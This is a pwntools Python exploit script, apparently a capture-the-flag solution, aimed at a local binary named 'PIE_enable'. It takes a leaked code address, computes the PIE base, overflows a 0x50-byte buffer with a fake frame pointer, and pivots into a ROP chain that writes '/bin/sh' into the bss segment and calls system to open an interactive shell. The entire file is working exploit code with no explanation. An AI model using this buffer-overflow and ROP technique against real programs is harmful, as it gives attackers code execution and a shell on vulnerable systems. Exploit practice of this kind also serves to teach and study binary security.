#! /usr/bin/python3
from pwn import *
# pyright: reportUndefinedVariable=false

context.os = 'linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

#libc = ELF('/home/sev1n/tools/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc.so.6')
#libc = ELF('./')
#elf = ELF('./')

context.log_level = 'debug'
debug = 1

if debug:
    io = process('./PIE_enable')
else:
    io = remote('')

def p():
    gdb.attach(proc.pidof(io)[0])


#one_gadget = [,,]
io.recvuntil(b"Vuln's address is:")

code_base = io.recvuntil(b"\n", drop = True)
code_base = int(code_base, 16) - 0x1245
success("code_base --> " + hex(code_base))
#p()
bss = code_base + 0x4d00

pop_rdi = code_base +  0x0000000000001323 # pop rdi ; ret
pop_rsi_r15 = code_base + 0x0000000000001321 # pop rsi ; pop r15 ; ret

fake_rbp = code_base + 0x4d08
payload = b'a' * 0x50 + p64(fake_rbp)
payload += flat(
    pop_rsi_r15, bss, 0, 0x1281 + code_base # write to bss seg
)
io.send(payload)

pause()

at_bss = flat(
    b"/bin/sh\x00", #0x4100
    bss + 0x100,
    pop_rdi,
    bss,
    code_base + 0x11df, #ret,
    code_base + 0x11df, #ret,
    code_base + 0x10a0, # call system
    bss
)
io.send(at_bss)


io.interactive()

